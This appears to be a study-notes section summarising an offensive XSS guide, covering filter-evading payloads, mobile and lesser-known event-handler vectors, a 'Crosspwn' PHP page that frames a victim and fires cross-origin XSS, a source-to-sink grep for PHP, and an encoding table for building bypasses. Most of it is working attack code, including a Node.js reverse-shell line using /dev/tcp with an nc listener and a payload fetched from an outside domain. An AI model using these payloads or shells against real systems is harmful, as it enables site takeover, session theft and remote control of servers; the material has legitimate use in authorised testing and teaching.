# Section 5: Miscellaneous — Utilities, Niche Vectors & Encoding Reference

> **Era note:** encoding tables and polyglot tricks age slowly but sandbox/browser behaviors do — verify exotic vectors in your own lab before sending them at a program. OOB utilities point only at tester-controlled infrastructure.

## Core Idea
Grab-bag of force multipliers: one-shot filter-aware vectors, delay tricks, shortest-possible XSS, mobile handlers, Crosspwn cross-origin tool, a PHP static-analysis finder, Node.js RCE, and the ASCII encoding table for building bypasses.

## Key Concepts
- **Multi-case filter-aware one-shot**: `'"</Script><Html /Onmouseover=(alert)(1) //` covers quote/tag/handler cases in a single probe
- **Execution delay**: `onload=function(){$.getScript('//host/2.js')}` waits for jQuery/resources to finish loading
- **Valid-src image**: base64 1px GIF in `src` triggers `onload` (not `onerror`) — dodges error-handler filtering
- **Shortest XSS**: `<base href=//short.do>` + native relative-path `<script src>` → your domain answers that path (or 404 page) with payload
- **Mobile handlers**: `ontouchstart/end/move`, `onorientationchange` for mobile-only surfaces
- **Crosspwn**: PHP tool that iframes a target and fires `postMessage`, `onresize`, `onhashchange` remotely — doubles as origin-bypass and payload-hiding helper (`eval(name)`)
- **PHP static XSS finder**: bash script greps PHP sources for `$_GET/$_POST/$_REQUEST`→`echo/print/die` source→sink flows
- **Node.js RCE**: `require('child_process').exec('bash -c "bash -i >& /dev/tcp/HOST/5855 0>&1"')` + `nc -lp 5855`
- **ASCII encoding table**: char → URL `%`, HTML entity `&#N;`/`&name;`, JS octal `\N`, hex `\xN`, unicode `\u00N` — remember `%26`/`%23` for `&`/`#` inside URLs

## Code Examples

Delay + valid-src + shortest:
```html
onload=x=>$.getScript('//brutelogic.com.br/2.js')
<img src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= onload=alert(1)>
<base href=//knoxss.me>
```

Mobile + body + less-known vectors:
```html
<html ontouchstart=alert(1)>
<body onpageshow=alert(1)>
<body onhashchange=alert(1)><a href=%23x>click this!#x
<marquee onstart=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<input autofocus onblur=alert(1)>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
```

Crosspwn (save as crosspwn.php):
```html
<!DOCTYPE html>
<body onload="crossPwn()">
<iframe src="<?php echo htmlentities($_GET['target'], ENT_QUOTES) ?>"
 name="<?php echo $_GET['name'] ?>" height="0" style="visibility:hidden"></iframe>
<script>
  function crossPwn() {
    frames[0].postMessage('<?php echo $_GET["msg"] ?>','*');          // onmessage
    document.getElementsByTagName('iframe')[0].setAttribute('height','1'); // onresize
    document.getElementsByTagName('iframe')[0].src = '<?php echo $_GET["target"] ?>' + '#brute'; // onhashchange
  }
</script>
</body></html>
```
Usage: `http://allowed-origin.attacker.tld/crosspwn.php?target=//victim/page&msg=<payload>` — or `&name=alert(document.domain)` with vector `<svg/onload=eval(name)>`.

Node.js RCE:
```js
require('child_process').exec('bash -c "bash -i >& /dev/tcp/HOST/5855 0>&1"')
// listener: nc -lp 5855
```

PHP static finder (source→sink grep):
```bash
sources=(GET POST REQUEST "SERVER\['PHP" "SERVER\['PATH_" "SERVER\['REQUEST_U")
sinks=(? echo die print printf print_r var_dump)
# grep each sink for direct $_SOURCE or variables assigned from it; -r for recursion
```

## Reference Tables

Encoding quick rows (full table in source pp. 23–26):
| Char | URL | HTML entity | JS octal | JS hex | JS unicode |
|------|-----|-------------|----------|--------|------------|
| `"`  | %22 | &quot; &#34; | \42 | \x22 | \u0022 |
| `'`  | %27 | &apos; &#39; | \47 | \x27 | \u0027 |
| `<`  | %3C | &lt; &#60;  | \74 | \x3C | \u003C |
| `>`  | %3E | &gt; &#62;  | \76 | \x3E | \u003E |
| `(`  | %28 | &lpar; &#40; | \50 | \x28 | \u0028 |
| `)`  | %29 | &rpar; &#41; | \51 | \x29 | \u0029 |
| `=`  | %3D | &equals; &#61;| \75 | \x3D | \u003D |
| ` `  | %20 | &#32;       | \40 | \x20 | \u0020 |
| `/`  | %2F | &sol; &#47; | \57 | \x2F | \u002F |

## Anti-patterns
- **Static payloads only**: combine one-shot + fragment + delay techniques per surface; don't rely on a single vector.
- **Forgetting `#`/`&` URL-encoding**: payload chars inside URL params must be `%23`/`%26`.

## Key Takeaways
1. `<base href>` + relative script = the shortest weaponizable XSS primitive.
2. Crosspwn converts postMessage/resize/hashchange surfaces into remote-fireable XSS.
3. The ASCII table is the bypass construction kit — build encodings to match the blocked primitive.
4. Source→sink grep (`$_GET`→`echo`) is the fastest PHP code-review XSS pass.
5. Mobile apps need touch/orientation handlers; desktop vectors won't fire.

## Connects To
- **ch03-filter-bypass**: encoding table feeds all bypass construction
- **ch04-exploitation**: Node RCE and Crosspwn extend exploitation reach
